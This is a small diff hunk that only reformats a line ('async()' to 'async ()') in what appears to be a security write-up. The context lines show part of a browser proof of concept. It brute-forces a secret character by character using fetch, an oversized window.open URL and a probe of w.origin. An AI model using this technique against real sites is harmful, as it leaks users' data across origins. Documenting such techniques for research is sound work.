@@ -135,7 +135,7 @@ This can be extended to the following PoC, which brute-forces a character of the
             fetch("/?try=" + char)
             let w = window.open(curr + char +  "#" + "A".repeat(2 * 1024 * 1024 - curr.length - 2))
             
-            const check = async() => {
+            const check = async () => {
                 try {
                     w.origin
                 } catch {
